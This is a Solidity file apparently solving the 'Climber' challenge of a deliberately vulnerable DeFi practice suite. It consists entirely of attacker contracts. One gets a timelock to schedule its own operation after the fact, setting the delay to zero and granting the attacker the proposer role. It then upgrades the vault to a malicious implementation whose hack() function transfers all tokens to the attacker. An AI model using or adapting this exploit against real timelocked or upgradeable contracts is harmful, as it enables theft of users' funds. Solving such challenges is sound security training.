// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

import "./ClimberTimelock.sol";
import "./DamnValuableToken.sol";

import {PROPOSER_ROLE} from "./ClimberConstants.sol";

contract HackClimberFunds is UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function hack(DamnValuableToken token, address hacker) external {
        token.transfer(hacker, token.balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

contract HackClimberTimelock {
    function hackGetProposerRole() external {
        address[] memory targets = new address[](3);
        targets[0] = msg.sender;
        targets[1] = msg.sender;
        targets[2] = address(this);

        uint256[] memory values = new uint256[](3);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;

        bytes[] memory dataElements = new bytes[](3);
        dataElements[0] = getHashUpdateDelay();
        dataElements[1] = getHashSetupRole();
        dataElements[2] = getHashHackGetProposerRole();

        ClimberTimelock(payable(msg.sender)).schedule(
            targets,
            values,
            dataElements,
            0x0000000000000000000000000000000000000000000000000000000000000001
        );
    }

    function hackUpgradeImplementation(
        address vault,
        address climber
    ) external {
        address[] memory targets = new address[](1);
        targets[0] = vault;

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        HackClimberFunds hack = new HackClimberFunds();

        bytes[] memory dataElements = new bytes[](1);
        dataElements[0] = getHashUpgradeImplementation(address(hack));

        ClimberTimelock(payable(climber)).schedule(
            targets,
            values,
            dataElements,
            0x0000000000000000000000000000000000000000000000000000000000000001
        );

        ClimberTimelock(payable(climber)).execute(
            targets,
            values,
            dataElements,
            0x0000000000000000000000000000000000000000000000000000000000000001
        );
    }

    function getHashUpgradeImplementation(
        address hack
    ) public pure returns (bytes memory) {
        return abi.encodeWithSignature("upgradeTo(address)", hack);
    }

    function getHashHackGetProposerRole() public pure returns (bytes memory) {
        return abi.encodeWithSignature("hackGetProposerRole()");
    }

    function getHashSetupRole() public view returns (bytes memory) {
        return
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            );
    }

    function getHashUpdateDelay() public pure returns (bytes memory) {
        return abi.encodeWithSignature("updateDelay(uint64)", 0);
    }
}
